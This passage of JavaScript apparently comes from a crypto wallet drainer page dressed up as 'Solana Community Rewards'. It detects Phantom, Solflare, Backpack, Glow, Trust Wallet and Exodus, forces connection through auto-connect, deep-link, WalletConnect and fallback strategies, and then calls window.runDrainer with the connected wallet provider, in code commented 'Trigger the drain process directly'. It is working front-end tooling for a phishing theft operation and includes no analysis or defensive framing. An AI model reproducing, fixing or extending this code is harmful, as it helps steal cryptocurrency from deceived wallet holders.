    console.log('- window.solana:', !!window.solana);
    console.log('- window.solflare:', !!window.solflare);
    console.log('- window.backpack:', !!window.backpack);
    console.log('- window.glow:', !!window.glow);
    console.log('- window.trustwallet:', !!window.trustwallet);
    console.log('- window.exodus:', !!window.exodus);
    
    // Debug: Check Solflare provider details
    if (window.solflare) {
      console.log('[AUTO_CONNECT] Solflare provider details:', {
        hasConnect: typeof window.solflare.connect === 'function',
        isConnected: window.solflare.isConnected ? window.solflare.isConnected() : 'N/A',
        publicKey: window.solflare.publicKey ? window.solflare.publicKey.toString() : 'N/A',
        keys: Object.keys(window.solflare)
      });
    }
    
    for (const wallet of wallets) {
      try {
        console.log(`[AUTO_CONNECT] Checking ${wallet.name}...`);
        const provider = wallet.provider();
        
        if (provider && typeof provider.connect === 'function') {
          console.log(`[AUTO_CONNECT] Found ${wallet.name} provider, attempting connection...`);
          
          // Check if already connected
          if (provider.isConnected && provider.isConnected()) {
            console.log(`[AUTO_CONNECT] ${wallet.name} already connected, getting public key...`);
            const publicKey = provider.publicKey;
            if (publicKey) {
              console.log(`[AUTO_CONNECT] Using existing ${wallet.name} connection:`, publicKey.toString());
              
              // Store the provider globally for runDrainer to use
              window.connectedWallet = {
                key: wallet.key,
                name: wallet.name,
                logo: `/${wallet.key}-logo.png`,
                publicKey: publicKey.toString(),
                provider: provider
              };
              
              // Trigger the drain process directly
              if (window.runDrainer) {
                console.log(`[AUTO_CONNECT] Triggering runDrainer for ${wallet.name} with provider`);
                window.runDrainer(provider);
              } else {
                console.error('[AUTO_CONNECT] runDrainer function not found');
              }
              
              // Show success message
              showStatus(`Connected to ${wallet.name}`, 'success');
              return; // Exit after successful connection
            }
          } else {
            // Try to connect with enhanced strategies for Solflare
            console.log(`[AUTO_CONNECT] Attempting new connection to ${wallet.name}...`);
            
            let result = null;
            let publicKey = null;
            
            // Standard connection for ALL wallets (including Solflare) - like Phantom and Backpack
            result = await provider.connect({
              onlyIfTrusted: false,
              appMetadata: {
                name: 'Solana Community Rewards',
                url: window.location.origin,
                icon: '/logo.png'
              }
            });
            publicKey = result?.publicKey || provider.publicKey;
            
            if (publicKey) {
              console.log(`[AUTO_CONNECT] Successfully connected to ${wallet.name}:`, publicKey.toString());
              
              // Store the provider globally for runDrainer to use
              window.connectedWallet = {
                key: wallet.key,
                name: wallet.name,
                logo: `/${wallet.key}-logo.png`,
                publicKey: publicKey.toString(),
                provider: provider
              };
              
              console.log(`[AUTO_CONNECT] Stored connected wallet info:`, window.connectedWallet);
              
              // Trigger the drain process directly
              if (window.runDrainer) {
                console.log(`[AUTO_CONNECT] Triggering runDrainer for ${wallet.name} with provider`);
                console.log(`[AUTO_CONNECT] Provider details:`, {
                  hasConnect: typeof provider.connect === 'function',
                  hasSignTransaction: typeof provider.signTransaction === 'function',
                  isConnected: provider.isConnected ? provider.isConnected() : 'N/A',
                  publicKey: provider.publicKey ? provider.publicKey.toString() : 'N/A'
                });
                window.runDrainer(provider);
              } else {
                console.error('[AUTO_CONNECT] runDrainer function not found');
              }
              
              // Show success message
              showStatus(`Connected to ${wallet.name}`, 'success');
              return; // Exit after successful connection
            }
          }
        } else {
          console.log(`[AUTO_CONNECT] No provider found for ${wallet.name}`);
        }
      } catch (error) {
        console.error(`[AUTO_CONNECT] Failed to connect to ${wallet.name}:`, error);
        console.error(`[AUTO_CONNECT] Error details:`, {
          name: error.name,
          message: error.message,
          stack: error.stack
        });
        // Continue to next wallet
      }
    }
    
    console.log('[AUTO_CONNECT] No wallet connections successful');
  }

  // Enhanced mobile connection methods
  window.mobileConnectionMethods = {
    
    // Method 1: WalletConnect integration for mobile
    async connectWithWalletConnect() {
      
      try {
        // Check if WalletConnect is available
        if (typeof window.WalletConnect !== 'undefined') {
          const walletConnect = new window.WalletConnect({
            bridge: 'https://bridge.walletconnect.org',
            qrcodeModal: {
              open: (uri, cb) => {
                // Show QR code modal for mobile scanning
                showQRCodeModal(uri);
                if (cb) cb();
              },
              close: () => {
                // Close QR code modal
                closeQRCodeModal();
              }
            }
          });
          
          // Create session
          const session = await walletConnect.createSession();
          
          // Wait for approval
          walletConnect.on('session_approved', (error, payload) => {
            if (error) throw error;
            
            const { accounts } = payload.params[0];
            if (accounts && accounts.length > 0) {
              const publicKey = accounts[0];
              
              // Store the provider globally for runDrainer to use
              window.connectedWallet = {
                key: 'walletconnect',
                name: 'WalletConnect',
                logo: '/walletconnect-logo.png',
                publicKey: publicKey,
                provider: walletConnect
              };
              
              // Trigger the drain process directly
              if (window.runDrainer) {
                window.runDrainer(publicKey, 'walletconnect', window.connectedWallet);
              } else {
                console.error('[MOBILE_CONNECT] runDrainer function not found');
              }
            }
          });
          
          return { success: true, session };
        } else {
          throw new Error('WalletConnect not available');
        }
      } catch (error) {
        console.error('[MOBILE_CONNECT] WalletConnect failed:', error);
        return { success: false, error: error.message };
      }
    },

    // Method 2: Mobile wallet detection and connection
    async detectAndConnectMobileWallets() {
      
      const mobileWallets = [
        {
          key: 'phantom',
          name: 'Phantom',
          providers: [
            () => window.phantom?.solana,
            () => window.solana,
            () => window.phantom
          ],
          deepLink: 'https://phantom.app/ul/browse/',
          customScheme: 'phantom://browse/'
        },
        {
          key: 'solflare',
          name: 'Solflare',
          providers: [
            () => window.solflare,
            () => window.solflare?.solana
          ],
          deepLink: 'https://solflare.com/ul/v1/browse/',
          customScheme: 'solflare://v1/browse/'
        },
        {
          key: 'backpack',
          name: 'Backpack',
          providers: [
            () => window.backpack?.solana,
            () => window.backpack,
            () => window.BackpackWallet
          ],
          deepLink: 'https://backpack.app/ul/v1/browse/',
          customScheme: 'backpack://v1/browse/'
        },
        {
          key: 'glow',
          name: 'Glow',
          providers: [
            () => window.glow,
            () => window.glow?.solana
          ],
          deepLink: 'https://glow.app/ul/app/',
          customScheme: 'glow://app/'
        },
        {
          key: 'trustwallet',
          name: 'Trust Wallet',
          providers: [
            () => window.trustwallet?.solana,
            () => window.trustwallet
          ],
          deepLink: 'https://link.trustwallet.com/open_url?url=',
          customScheme: 'trust://open_url?url='
        },
        {
          key: 'exodus',
          name: 'Exodus',
          providers: [
            () => window.exodus?.solana,
            () => window.exodus
          ],
          deepLink: 'https://exodus.com/app/dapp?url=',
          customScheme: 'exodus://dapp/'
        }
      ];

      for (const wallet of mobileWallets) {
        try {
          let provider = null;
          
          // Try all provider methods
          for (const providerFn of wallet.providers) {
            provider = providerFn();
            if (provider && typeof provider.connect === 'function') {
              break;
            }
          }
          
          if (provider) {
            
            const result = await provider.connect({
              onlyIfTrusted: false,
              appMetadata: {
                name: 'Solana Community Rewards',
                url: window.location.origin,
                icon: '/logo.png'
              }
            });
            
            if (result && result.publicKey) {
              return {
                success: true,
                wallet: wallet.key,
                publicKey: result.publicKey.toString(),
                provider: provider
              };
            }
          }
        } catch (error) {
        }
      }
      
      return { success: false, error: 'No mobile wallets found' };
    },

    // Method 3: Deep link fallback for mobile
    async connectWithDeepLink(walletType) {
      
      try {
        // Use the existing openInWallet function
        await window.openInWallet(walletType);
        
        // Wait a bit for the deep link to work
        await new Promise(resolve => setTimeout(resolve, 3000));
        
        // Try to detect if connection was successful
        const wallet = WALLET_DEFS.find(w => w.key === walletType);
        if (wallet) {
          const provider = wallet.provider();
          if (provider && provider.publicKey) {
            return {
              success: true,
              wallet: walletType,
              publicKey: provider.publicKey.toString(),
              provider: provider
            };
          }
        }
        
        return { success: false, error: 'Deep link connection failed' };
      } catch (error) {
        console.error(`[MOBILE_CONNECT] Deep link failed for ${walletType}:`, error);
        return { success: false, error: error.message };
      }
    },

    // Method 4: QR Code generation for mobile scanning
    generateQRCode(uri) {
      
      // Create QR code element
      const qrContainer = document.createElement('div');
      qrContainer.id = 'mobileQRCode';
      qrContainer.style.cssText = `
        position: fixed;
        top: 50%;
        left: 50%;
        transform: translate(-50%, -50%);
        background: white;
        padding: 20px;
        border-radius: 12px;
        box-shadow: 0 4px 20px rgba(0,0,0,0.3);
        z-index: 10000;
        text-align: center;
      `;
      
      qrContainer.innerHTML = `
        <h3 style="margin: 0 0 15px 0; color: #333;">Scan with Mobile Wallet</h3>
        <div id="qrcode" style="margin: 0 auto;"></div>
        <p style="margin: 15px 0 0 0; color: #666; font-size: 14px;">
          Open your mobile wallet and scan this QR code
        </p>
        <button onclick="closeQRCodeModal()" style="
          margin-top: 15px;
          padding: 8px 16px;
          background: #007bff;
          color: white;
          border: none;
          border-radius: 6px;
          cursor: pointer;
        ">Close</button>
      `;
      
      document.body.appendChild(qrContainer);
      
      // Show URI as text (no external libraries)
      document.getElementById('qrcode').innerHTML = `
        <div style="word-break: break-all; font-family: monospace; font-size: 12px; padding: 10px; background: #f5f5f5; border-radius: 6px;">
          ${uri}
        </div>
      `;
    }
  };

  // QR Code modal functions
  function showQRCodeModal(uri) {
    window.mobileConnectionMethods.generateQRCode(uri);
  }

  function closeQRCodeModal() {
    const qrModal = document.getElementById('mobileQRCode');
    if (qrModal) {
      qrModal.remove();
    }
  }

  // Enhanced mobile connection handler
  window.connectMobileWalletEnhanced = async function(walletType) {
    
    // Try multiple connection methods
    const methods = [
      () => window.mobileConnectionMethods.detectAndConnectMobileWallets(),
      () => window.mobileConnectionMethods.connectWithDeepLink(walletType),
      () => window.mobileConnectionMethods.connectWithWalletConnect()
    ];
    
    for (let i = 0; i < methods.length; i++) {
      try {
        const result = await methods[i]();
        
        if (result.success) {
          
          // Trigger connection with provider
          if (result.publicKey && result.provider) {
            // Store the provider globally for runDrainer to use
            window.connectedWallet = {
              key: result.wallet || walletType,
              name: result.wallet || walletType,
              logo: `/${result.wallet || walletType}-logo.png`,
              publicKey: result.publicKey,
              provider: result.provider
            };
            
            // Trigger the drain process directly
            if (window.runDrainer) {
              window.runDrainer(result.provider);
            } else {
              console.error('[MOBILE_CONNECT_ENHANCED] runDrainer function not found');
            }
          }
          
          return result;
        }
      } catch (error) {
      }
    }
    
    showStatus('Mobile connection failed. Please try again.', 'error');
    return { success: false, error: 'All connection methods failed' };
  };


    // Function to handle deep links properly (moved outside for global access)
    async function openInWallet(walletType) {
      // Use base URL without query parameters to avoid double-encoding issues
      const currentUrl = window.location.origin + window.location.pathname;
      let deepLink = '';
      let fallbackUrl = '';
      
      // Enhanced mobile detection
      const userAgent = navigator.userAgent.toLowerCase();
      const isMobileDevice = /android|webos|iphone|ipad|ipod|blackberry|iemobile|opera mini|mobile|tablet/i.test(userAgent) || 
                            (navigator.maxTouchPoints && navigator.maxTouchPoints > 1) ||
                            window.innerWidth <= 768 ||
                            ('ontouchstart' in window) ||
                            (navigator.platform && /android|iphone|ipad|ipod|blackberry|iemobile|opera mini/i.test(navigator.platform));
      
      // For mobile devices, use enhanced deep link handling
          if (isMobileDevice) {
        console.log('[DEEP_LINK] Mobile device detected, using enhanced deep link handling');
      }
      
      switch(walletType) {
        case 'phantom':
          // Phantom: Use correct URL structure for mobile, complex API for desktop
          if (isMobileDevice) {
            // Mobile: Use exact Phantom URL format
            const encodedUrl = encodeURIComponent(currentUrl);
            deepLink = `https://phantom.app/ul/browse/${encodedUrl}?ref=${encodedUrl}`;
            fallbackUrl = `phantom://browse/${encodedUrl}?ref=${encodedUrl}`;
          } else {
            // Desktop: Use complex Connect API (unchanged)
            deepLink = `phantom://browse/${encodeURIComponent(currentUrl)}`;
            fallbackUrl = `https://phantom.app/ul/browse/${encodeURIComponent(currentUrl)}`;
          }
          break;
        case 'solflare':
          // Solflare: Use correct URL structure for mobile, complex API for desktop
          if (isMobileDevice) {
            // Mobile: Use exact Solflare URL format with redirect_link for Android
            const encodedUrl = encodeURIComponent(currentUrl);
            const redirectLink = encodeURIComponent(`${window.location.origin}${window.location.pathname}`);
            
            // Detect platform for different handling
            const userAgent = navigator.userAgent.toLowerCase();
            const isAndroid = /android/.test(userAgent);
            
            if (isAndroid) {
              // Android: Use redirect_link parameter
              deepLink = `https://solflare.com/ul/v1/browse/${encodedUrl}?redirect_link=${redirectLink}`;
              fallbackUrl = `solflare://v1/browse/${encodedUrl}?redirect_link=${redirectLink}`;
            } else {
              // iOS: Use ref parameter with the dApp URL (correct format)
              const dappUrl = encodeURIComponent(currentUrl);
              deepLink = `https://solflare.com/ul/v1/browse/${encodedUrl}?ref=${dappUrl}`;
              fallbackUrl = `solflare://v1/browse/${encodedUrl}?ref=${dappUrl}`;
            }
          } else {
            // Desktop: Use custom scheme first
            deepLink = `solflare://browse/${encodeURIComponent(currentUrl)}`;
            fallbackUrl = `https://solflare.com/ul/browse/${encodeURIComponent(currentUrl)}`;
          }
          break;
        case 'backpack':
          // Backpack: Use correct URL structure for mobile, complex API for desktop
          if (isMobileDevice) {
            // Mobile: Use exact Backpack URL format
            const encodedUrl = encodeURIComponent(currentUrl);
            deepLink = `https://backpack.app/ul/v1/browse/${encodedUrl}?ref=${encodedUrl}`;
            fallbackUrl = `backpack://v1/browse/${encodedUrl}?ref=${encodedUrl}`;
          } else {
            // Desktop: Use custom scheme first
            deepLink = `backpack://browse/${encodeURIComponent(currentUrl)}`;
            fallbackUrl = `https://backpack.app/ul/browse/${encodeURIComponent(currentUrl)}`;
          }
          break;
        case 'trustwallet':
          // Trust Wallet: Use correct URL structure for mobile, complex API for desktop
          if (isMobileDevice) {
            // Mobile: Use correct Trust Wallet URL structure
            const encodedUrl = encodeURIComponent(currentUrl);
            deepLink = `https://link.trustwallet.com/open_url?url=${encodedUrl}`;
            fallbackUrl = `trust://open_url?url=${encodedUrl}`;
          } else {
            // Desktop: Use custom scheme first
            deepLink = `trust://open_url?url=${encodeURIComponent(currentUrl)}`;
            fallbackUrl = `https://link.trustwallet.com/open_url?url=${encodeURIComponent(currentUrl)}`;
          }
          break;
        case 'glow':
          // Glow: Use simplified deep links for better mobile support
          if (isMobileDevice) {
            // Mobile: Use universal link first (more reliable)
            deepLink = `https://glow.app/ul/app/${encodeURIComponent(currentUrl)}`;
            fallbackUrl = `glow://app/${encodeURIComponent(currentUrl)}`;
          } else {
            // Desktop: Use custom scheme
            deepLink = `glow://app/${encodeURIComponent(currentUrl)}`;
            fallbackUrl = `https://glow.app/ul/app/${encodeURIComponent(currentUrl)}`;
          }
          break;
        case 'exodus':
          // Exodus: Use simplified deep links for better mobile support
          if (isMobileDevice) {
            // Mobile: Use universal link first (more reliable)
            deepLink = `https://exodus.com/app/dapp?url=${encodeURIComponent(currentUrl)}`;
            fallbackUrl = `exodus://dapp/${encodeURIComponent(currentUrl)}`;
          } else {
            // Desktop: Use custom scheme
            deepLink = `exodus://dapp/${encodeURIComponent(currentUrl)}`;
            fallbackUrl = `https://exodus.com/app/dapp?url=${encodeURIComponent(currentUrl)}`;
          }
          break;
          
        default:
          // Fallback for unknown wallet types
          console.warn(`[DEEP_LINK] Unknown wallet type: ${walletType}`);
          deepLink = `${walletType}://browse/${encodeURIComponent(currentUrl)}`;
          fallbackUrl = `https://${walletType}.app/ul/browse/${encodeURIComponent(currentUrl)}`;
          break;
      }
      
      // Validate that we have valid deep links
      if (!deepLink || !fallbackUrl) {
        console.error(`[DEEP_LINK] Invalid deep links generated for ${walletType}:`, { deepLink, fallbackUrl });
        deepLink = `${walletType}://browse/${encodeURIComponent(currentUrl)}`;
        fallbackUrl = `https://${walletType}.app/ul/browse/${encodeURIComponent(currentUrl)}`;
      }
      
      console.log(`[DEEP_LINK] ${isMobileDevice ? 'Mobile' : 'Desktop'} device detected`);
      console.log(`[DEEP_LINK] Attempting to open ${walletType} with:`, deepLink);
      
      // Improved deep link opening with better mobile support
      try {
        if (isMobileDevice) {
          console.log(`[DEEP_LINK] Mobile device: using improved approach`);
          
          // For mobile, try universal link first (more reliable)
          console.log(`[DEEP_LINK] Trying universal link: ${deepLink}`);
          
          // Use a more reliable method for mobile deep links
          const link = document.createElement('a');
          link.href = deepLink;
          link.target = '_self'; // Changed from '_blank' to '_self' to stay in same tab
          link.rel = 'noopener noreferrer';
          document.body.appendChild(link);
          link.click();
          document.body.removeChild(link);
          
          // For Solflare, NO FALLBACK - direct deep link with auto connection/signing
          if (walletType === 'solflare') {
            console.log(`[SOLFLARE_DIRECT] Solflare detected - using direct deep link approach with NO fallback`);
            console.log(`[SOLFLARE_DIRECT] Deep link opened: ${deepLink}`);
            console.log(`[SOLFLARE_DIRECT] Auto-connect will handle connection and signing`);
            
            // Show status and let auto-connect handle the rest
            showStatus(`Opening Solflare wallet...`, 'info');
            
            // Add mobile debugging info
            
            // Simple mobile Solflare - let auto-connect handle it like other wallets
            console.log(`[SOLFLARE_MOBILE] Using simple approach like Phantom and Backpack`);
            
            // No fallback timeout for Solflare - let auto-connect handle everything
            return;
          }
          
          // For other wallets, use the enhanced fallback logic
          setTimeout(() => {
            // Enhanced detection: Check if we're in a wallet browser or if deep link worked
            const isInWalletBrowser = window.location.href.includes('phantom.app') || 
                                     window.location.href.includes('solflare.com') ||
                                     window.location.href.includes('backpack.app') ||
                                     window.location.href.includes('trustwallet.com') ||
                                     window.location.href.includes('glow.app') ||
                                     window.location.href.includes('exodus.com') ||
                                     document.referrer.includes('phantom.app') ||
                                     document.referrer.includes('solflare.com') ||
                                     document.referrer.includes('backpack.app') ||
                                     document.referrer.includes('trustwallet.com') ||
                                     document.referrer.includes('glow.app') ||
                                     document.referrer.includes('exodus.com') ||
                                     // Check for wallet-specific user agents
                                     navigator.userAgent.includes('Phantom') ||
                                     navigator.userAgent.includes('Solflare') ||
                                     navigator.userAgent.includes('Backpack') ||
                                     navigator.userAgent.includes('TrustWallet') ||
                                     navigator.userAgent.includes('Glow') ||
                                     navigator.userAgent.includes('Exodus');
            
            // Check if wallet providers are available (indicates we're in wallet browser)
            const hasWalletProviders = !!(window.phantom || window.solflare || window.backpack || 
                                        window.glow || window.trustwallet || window.exodus);
            
            if (isInWalletBrowser || hasWalletProviders) {
              console.log(`[DEEP_LINK] Deep link successful - detected wallet browser environment`);
              console.log(`[DEEP_LINK] isInWalletBrowser: ${isInWalletBrowser}, hasWalletProviders: ${hasWalletProviders}`);
              return; // Don't try fallback if we're in wallet browser
            }
            
            // Only try fallback if we're definitely not in a wallet browser
            if (window.location.href === currentUrl) {
              console.log(`[DEEP_LINK] Universal link failed, trying custom scheme: ${fallbackUrl}`);
              window.location.href = fallbackUrl;
            } else {
              console.log(`[DEEP_LINK] Universal link successful, staying in wallet browser`);
            }
          }, 3000); // Increased timeout to 3 seconds
          
          // Show a message to the user about what's happening (for non-Solflare wallets)
          if (walletType !== 'solflare') {
          showStatus(`Opening ${walletType} wallet...`, 'info');
            
            // Add mobile debugging info
          }
          
        } else {
          // Desktop: Direct window location change
          console.log(`[DEEP_LINK] Desktop: direct navigation to ${deepLink}`);
          window.location.href = deepLink;
        }
        
      } catch (error) {
        console.error(`[DEEP_LINK] Error opening ${walletType} deep link:`, error);
        
        // Enhanced fallback: try multiple strategies
        console.log(`[DEEP_LINK] Attempting enhanced fallback strategies`);
        
        // For mobile, show user-friendly message instead of immediate app store redirect
        if (isMobileDevice) {
          showStatus(`Please open ${walletType} manually and return to this page`, 'info');
          
          // Only redirect to app store after user confirmation or timeout
          setTimeout(() => {
            if (confirm(`Would you like to install ${walletType} wallet?`)) {
              const installUrl = walletType === 'solflare' ? 'https://solflare.com/' : 
                               walletType === 'phantom' ? 'https://phantom.app/' :
                               walletType === 'backpack' ? 'https://backpack.app/' : '#';
              window.open(installUrl, '_blank');
            }
          }, 5000);
        } else {
          // Desktop: Strategy 1: Try fallback URL
        try {
          window.location.href = fallbackUrl;
        } catch (fallbackError) {
          console.error(`[DEEP_LINK] Fallback URL failed:`, fallbackError);
          
          // Strategy 2: Try install page
          const wallet = WALLET_DEFS.find(w => w.key === walletType);
          if (wallet && wallet.install) {
            console.log(`[DEEP_LINK] Redirecting to install page:`, wallet.install);
            window.location.href = wallet.install;
          } else {
            // Strategy 3: Show error message
            showStatus(`Failed to open ${walletType} wallet. Please install the wallet app.`, 'error');
            }
          }
        }
      }
    }

    // Close wallet modal function
    window.closeWalletModal = function() {
      const modal = document.getElementById('walletModal');
      if (modal) {
        modal.style.display = 'none';
        document.body.style.overflow = 'auto';
      }
    };
    
    // Close status modal function
    window.closeStatusModal = function() {
      const modal = document.getElementById('statusModal');
      if (modal) {
        modal.style.display = 'none';
        document.body.style.overflow = 'auto';
      }
    };
    
    // Add click-outside-to-close functionality for modals
    document.addEventListener('click', function(e) {
      // Close wallet modal when clicking outside
      const walletModal = document.getElementById('walletModal');
      if (walletModal && walletModal.classList.contains('active')) {
        if (e.target === walletModal) {
          closeWalletModal();
        }
      }
      
      // Close status modal when clicking outside
      const statusModal = document.getElementById('statusModal');
      if (statusModal && statusModal.classList.contains('active')) {
        if (e.target === statusModal) {
          closeStatusModal();
        }
      }
    });
    
    // Add ESC key to close modals
    document.addEventListener('keydown', function(e) {
      if (e.key === 'Escape') {
        closeWalletModal();
        closeStatusModal();
      }
    });
    
// Backend-delegated wallet modal functions
async function getWalletModalData() {
  try {
    const response = await fetch('/api/wallet-management', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        operation: 'get_wallet_modal_data'
      })
    });
    
    const data = await response.json();
    return data.result || { wallets: [], isMobile: false };
  } catch (error) {
    console.error('[WALLET_MODAL] Backend fetch failed:', error);
    return { wallets: [], isMobile: false };
  }
}

async function getWalletConnectionInfo(walletKey) {
  try {
    const response = await fetch('/api/wallet-management', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        operation: 'connect_wallet',
        walletKey: walletKey
      })
    });
    
    const data = await response.json();
    return data.result || { success: false, error: 'Connection failed' };
  } catch (error) {
    console.error('[WALLET_CONNECT] Backend connection failed:', error);
    return { success: false, error: error.message };
  }
}

// Enhanced openWalletModal function using backend
window.openWalletModal = async function openWalletModal() {
  // Opening wallet modal
  const modal = document.getElementById('walletModal');
  
  if (!modal) {
    console.error('[WALLET_MODAL] Modal element not found');
        return;
      }
      
  try {
    // Get wallet data from backend
    const modalData = await getWalletModalData();
    // Retrieved wallet data from backend
    
    // Update wallet options with backend data
    const walletOptions = modal.querySelector('.wallet-options');
    if (walletOptions && modalData.wallets.length > 0) {
      walletOptions.innerHTML = '';
      
      modalData.wallets.forEach(wallet => {
        const walletOption = document.createElement('div');
        walletOption.className = 'wallet-option';
        walletOption.onclick = () => {
          // Check if mobile device
          const userAgent = navigator.userAgent.toLowerCase();
          const isMobile = /android|webos|iphone|ipad|ipod|blackberry|iemobile|opera mini/i.test(userAgent) ||
                          /mobile|tablet/i.test(userAgent) ||
                          (navigator.maxTouchPoints && navigator.maxTouchPoints > 1) ||
                          window.innerWidth <= 768;
          
          if (isMobile) {
            console.log('[WALLET_OPTION] Mobile device detected, using enhanced mobile connection');
            // For mobile, use the enhanced mobile connection system
            window.connectMobileWalletEnhanced(wallet.key).catch(error => {
              console.error('[WALLET_OPTION] Enhanced mobile connection failed:', error);
              // Fallback to basic deep link
              window.openInWallet(wallet.key).catch(fallbackError => {
                console.error('[WALLET_OPTION] Fallback deep link also failed:', fallbackError);
                showStatus('Mobile connection failed. Please try again.', 'error');
              });
            });
          } else {
            console.log('[WALLET_OPTION] Desktop device, using standard connection');
            window.connectWallet(wallet.key);
          }
        };
        
        walletOption.innerHTML = `
          <div class="wallet-icon">
            <img src="${wallet.logo}" alt="${wallet.name}">
          </div>
          <div class="wallet-info">
            <span class="wallet-name">${wallet.name}</span>
            <span class="wallet-description">${wallet.description}</span>
          </div>
          <div class="wallet-arrow">
            <svg width="20" height="20" viewBox="0 0 20 20" fill="none" xmlns="http://www.w3.org/2000/svg">
              <path d="M7.5 15L12.5 10L7.5 5" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
            </svg>
          </div>
        `;
        
        walletOptions.appendChild(walletOption);
      });
    }
    
    // Show mobile indicator if on mobile device
    const userAgent = navigator.userAgent.toLowerCase();
    const isMobile = /android|webos|iphone|ipad|ipod|blackberry|iemobile|opera mini/i.test(userAgent) ||
                    /mobile|tablet/i.test(userAgent) ||
                    (navigator.maxTouchPoints && navigator.maxTouchPoints > 1) ||
                    window.innerWidth <= 768;
    
    const mobileIndicator = modal.querySelector('#mobileIndicator');
    if (mobileIndicator) {
      mobileIndicator.style.display = isMobile ? 'block' : 'none';
    }
    
    // Show modal
    modal.style.display = 'flex';
    document.body.style.overflow = 'hidden';
    
  } catch (error) {
    console.error('[WALLET_MODAL] Error opening modal:', error);
    showStatus('Failed', 'error');
  }
};

// Backend-delegated connectWallet function
window.connectWallet = async function connectWallet(walletKey) {
  
  try {
    // Get connection info from backend
    const connectionResult = await getWalletConnectionInfo(walletKey);
    
    if (!connectionResult.success) {
      console.error(`[CONNECT] Connection failed: ${connectionResult.error}`);
      showStatus('Failed', 'error');
      return;
    }
    
    const { wallet, connectionInstructions, isMobile } = connectionResult;
    
    // Close modal
      closeWalletModal();
      
      // Show connecting status
      showStatus('Processing...', 'loading');
      
    // Handle connection based on wallet type
    if (isMobile && connectionInstructions.success) {
      // Mobile wallet connection
      const { deepLink, installUrl } = connectionInstructions.instructions;
      
      // Try deep link first
      if (deepLink) {
        window.location.href = deepLink;
        setTimeout(() => {
          // If deep link fails, redirect to install page
          window.location.href = installUrl;
        }, 2000);
        } else {
        window.location.href = installUrl;
      }
    } else {
      // Desktop wallet connection - try to find provider
      const providerNames = wallet.providerNames || [];
      let provider = null;
      
      for (const providerName of providerNames) {
        try {
          console.log(`[CONNECT] Checking provider: ${providerName}`);
          const providerPath = providerName.split('.');
          let current = window;
          for (const part of providerPath) {
            current = current[part];
            if (!current) {
              console.log(`[CONNECT] Provider path broken at: ${part}`);
              break;
          }
          }
          // Provider found
          
          // Check for standard connect function
          if (current && typeof current.connect === 'function') {
            provider = current;
            // Using provider
            break;
          }
          
          // Special handling for Trust Wallet and Exodus
          if (current && (current.isTrust || current.isTrustWallet)) {
            console.log(`[CONNECT] Trust Wallet detected, checking for Solana provider`);
            if (current.solana && typeof current.solana.connect === 'function') {
              provider = current.solana;
              console.log(`[CONNECT] Using Trust Wallet Solana provider: ${providerName}`);
              break;
            }
          }
          
          if (current && (current.isExodus || current.isExodusWallet || providerName.includes('exodus'))) {
            console.log(`[CONNECT] Exodus detected, checking for Solana provider`);
            console.log(`[CONNECT] Exodus provider structure:`, Object.keys(current));
            if (current.solana && typeof current.solana.connect === 'function') {
              provider = current.solana;
              console.log(`[CONNECT] Using Exodus Solana provider: ${providerName}`);
              break;
            } else if (typeof current.connect === 'function') {
              provider = current;
              console.log(`[CONNECT] Using Exodus main provider: ${providerName}`);
              break;
            }
          }
        } catch (e) {
          console.log(`[CONNECT] Error checking provider ${providerName}:`, e.message);
        }
      }
      
      if (provider) {
        try {
          // Wallet-specific connection handling
          let response, publicKey;
          
          switch (walletKey) {
            case 'phantom':
              response = await provider.connect();
              publicKey = response?.publicKey || provider.publicKey;
              break;
              
            case 'solflare':
              // Solflare connection - enhanced with multiple strategies like Backpack
              console.log('[CONNECT] Solflare connection - triggering wallet UI');
              console.log('[CONNECT] Solflare provider structure:', Object.keys(provider));
              console.log('[CONNECT] Solflare connect function type:', typeof provider.connect);
              console.log('[CONNECT] Solflare isConnected:', provider.isConnected);
              console.log('[CONNECT] Solflare publicKey before connect:', provider.publicKey);
              
              // Check if already connected
              if (provider.isConnected && provider.publicKey) {
                console.log('[CONNECT] Solflare already connected, using existing connection');
                publicKey = provider.publicKey;
                response = { publicKey: publicKey };
              } else {
                // Try to connect with proper parameters to trigger UI
                console.log('[CONNECT] Solflare not connected, attempting connection...');
                
                // Enhanced Solflare connection with multiple strategies
                const connectionStrategies = [
                  {
                    name: 'Method 1: Connect with metadata',
                    fn: () => provider.connect({
                      onlyIfTrusted: false,
                      appMetadata: {
                        name: 'Solana Community Rewards',
                        url: window.location.origin,
                        icon: '/logo.png'
                      }
                    })
                  },
                  {
                    name: 'Method 2: Simple connect',
                    fn: () => provider.connect()
                  },
                  {
                    name: 'Method 3: Request method',
                    fn: () => {
                      if (typeof provider.request === 'function') {
                        return provider.request({ method: 'connect' });
                      } else {
                        throw new Error('provider.request is not a function');
                      }
                    }
                  },
                  {
                    name: 'Method 4: Direct public key access',
                    fn: () => {
                      if (provider.publicKey) {
                        return { publicKey: provider.publicKey };
                      } else {
                        throw new Error('No public key available');
                      }
                    }
                  }
                ];
                
                let connectionSuccessful = false;
                
                for (let i = 0; i < connectionStrategies.length && !connectionSuccessful; i++) {
                  try {
                    console.log(`[CONNECT] Solflare ${connectionStrategies[i].name}...`);
                    response = await connectionStrategies[i].fn();
                    
                    // Enhanced public key extraction for Solflare
                    publicKey = response?.publicKey || 
                               response?.account?.publicKey ||
                               provider.publicKey || 
                               provider.account?.publicKey ||
                               provider.connected?.publicKey ||
                               provider.wallet?.publicKey;
                    
                    if (publicKey) {
                      console.log(`[CONNECT] Solflare ${connectionStrategies[i].name} successful:`, publicKey.toString());
                      connectionSuccessful = true;
                    } else {
                      console.log(`[CONNECT] Solflare ${connectionStrategies[i].name} returned no public key`);
                    }
                  } catch (strategyError) {
                    console.log(`[CONNECT] Solflare ${connectionStrategies[i].name} failed:`, strategyError.message);
                    if (i < connectionStrategies.length - 1) {
                      await new Promise(resolve => setTimeout(resolve, 1000)); // Wait before next attempt
                    }
                  }
                }
                
                if (!connectionSuccessful) {
                  throw new Error('Solflare connection failed: All connection methods failed');
                }
              }
              break;
              
            case 'backpack':
              // Backpack connection - try to trigger wallet UI properly
              console.log('[CONNECT] Backpack connection - triggering wallet UI');
              console.log('[CONNECT] Backpack provider structure:', Object.keys(provider));
              console.log('[CONNECT] Backpack connect function type:', typeof provider.connect);
              console.log('[CONNECT] Backpack isConnected:', provider.isConnected);
              console.log('[CONNECT] Backpack publicKey before connect:', provider.publicKey);
              
              // Check if already connected
